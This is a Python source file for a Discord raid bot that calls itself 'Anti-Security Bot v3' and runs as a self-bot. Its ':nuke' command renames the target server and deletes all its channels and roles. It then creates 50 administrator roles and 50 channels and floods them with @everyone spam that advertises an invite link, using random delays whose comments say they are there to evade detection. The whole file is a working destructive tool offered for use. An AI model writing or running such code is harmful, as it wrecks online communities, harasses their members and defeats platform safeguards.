import discord
from discord.ext import commands
import asyncio
import os
import random
import string
from dotenv import load_dotenv
import platform

# Load environment variables from a .env file
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- ANTI-SECURITY BOT CONFIGURATION ---
# A list of varied spam messages to avoid repetitive patterns
SPAM_MESSAGES = [
    "@everyone Raid by del1rium - Join us: https://discord.gg/cJJJWHfnn2",
    "@here The server has been compromised. Join: https://discord.gg/cJJJWHfnn2",
    "This server is now under new management. @everyone Join: https://discord.gg/cJJJWHfnn2"
]
# --- END CONFIGURATION ---

# Bot setup with all intents for maximum permissions
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, self_bot=True)

def clear_console():
    """Clears the console, detecting the operating system."""
    command = 'cls' if platform.system() == 'Windows' else 'clear'
    os.system(command)
    print("Console cleared. Bot is ready.")
    print(f'Anti-Security Bot v3 connected as {bot.user.name}')
    print('Primary command: :nuke')

@bot.event
async def on_ready():
    """Event triggered when the bot is connected and ready."""
    clear_console()

# --- ANTI-SECURITY BOT FUNCTIONS ---

async def change_server_name(guild):
    """Changes the server name to a disruptive, randomized string."""
    try:
        new_name = f"RAIDED BY DEL1RIUM {''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
        await guild.edit(name=new_name)
        print(f"Server name changed to: {new_name}")
    except discord.Forbidden:
        print("Error: Insufficient permissions to change the server name.")
    except Exception as e:
        print(f"An error occurred while changing the server name: {e}")

async def create_chaotic_roles(guild):
    """Creates 50 new roles with administrator permissions to disrupt server hierarchy."""
    print("Initiating mass role creation...")
    
    # Define administrator permissions to be assigned to the new roles
    admin_permissions = discord.Permissions(administrator=True)
    
    async def create_role(i):
        try:
            # Generate a disruptive and random role name
            role_name = f"hacked-role-{i}-{''.join(random.choices(string.ascii_lowercase, k=5))}"
            # Assign a random color to the role
            role_color = discord.Color(random.randint(0x000000, 0xFFFFFF))
            
            await guild.create_role(name=role_name, permissions=admin_permissions, color=role_color)
            print(f"Role '{role_name}' created with administrator permissions.")
        except discord.Forbidden:
            # This is a common failure point if the bot lacks the 'Manage Roles' permission
            print("Error: Insufficient permissions to create roles.")
        except Exception:
            # Ignore other potential errors to ensure the process continues
            pass

    # Execute the creation of 50 roles in parallel for maximum speed
    await asyncio.gather(*(create_role(i) for i in range(50)), return_exceptions=True)
    print("Mass role creation phase completed.")

# --- CORE RAID FUNCTIONS ---

async def spam_pings(channel):
    """Continuously sends randomized pings and messages at random intervals."""
    while True:
        try:
            message = random.choice(SPAM_MESSAGES)
            await channel.send(message)
            # Use a random delay to evade time-based pattern detection
            await asyncio.sleep(random.uniform(0.2, 0.8))
        except discord.Forbidden:
            # If permissions are lost, wait a random interval and retry
            await asyncio.sleep(random.randint(5, 15))
        except Exception:
            # For other errors, also wait and retry
            await asyncio.sleep(random.randint(10, 20))
            break

@bot.command(name='nuke')
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    """
    Anti-Security Nuke Command v3:
    1. Changes the server name.
    2. Deletes all existing channels and roles.
    3. Creates 50 chaotic roles with administrator permissions.
    4. Creates 50 new text channels.
    5. Initiates persistent, randomized spam in all new channels.
    """
    guild = ctx.guild
    if not guild:
        return

    print(f"Initiating Anti-Security Nuke v3 on server: {guild.name}")

    # --- EXECUTE DESTRUCTIVE ACTIONS IN PARALLEL ---
    await asyncio.gather(
        change_server_name(guild),
        return_exceptions=True
    )

    # Delete all existing roles and channels concurrently
    print("Deleting existing channels and roles...")
    # We do not delete the @everyone role or managed roles (for bots/integrations)
    roles_to_delete = [role for role in guild.roles if not role.is_default() and not role.is_managed()]
    
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        *(role.delete() for role in roles_to_delete),
        return_exceptions=True
    )
    print("Channels and roles deleted.")

    # Create new chaotic elements concurrently
    print("Creating chaotic roles and new channels...")
    await asyncio.gather(
        create_chaotic_roles(guild),
        return_exceptions=True
    )

    # Create 50 new channels and begin spamming
    async def create_and_spam(i):
        try:
            channel_name = f'raid-by-del1rium-{i+1}'
            channel = await guild.create_text_channel(channel_name)
            await spam_pings(channel)
        except Exception:
            pass

    await asyncio.gather(*(create_and_spam(i) for i in range(50)), return_exceptions=True)
    
    print("Nuke phase completed. Persistent spam is now active.")
    clear_console()

@bot.event
async def on_command_error(ctx, error):
    """Handles errors for commands."""
    if isinstance(error, commands.MissingPermissions):
        try:
            await ctx.send("You must have administrator permissions to use this command.")
        except:
            pass
    else:
        # Log other errors to the console without stopping the bot
        print(f"An ignored command error occurred: {error}")

if __name__ == "__main__":
    if TOKEN:
        # The 'reconnect=True' parameter ensures the bot will try to reconnect if it loses connection
        bot.run(TOKEN, reconnect=True)
    else:
        print("Error: The DISCORD_TOKEN is not configured. Please set it in your .env file.")

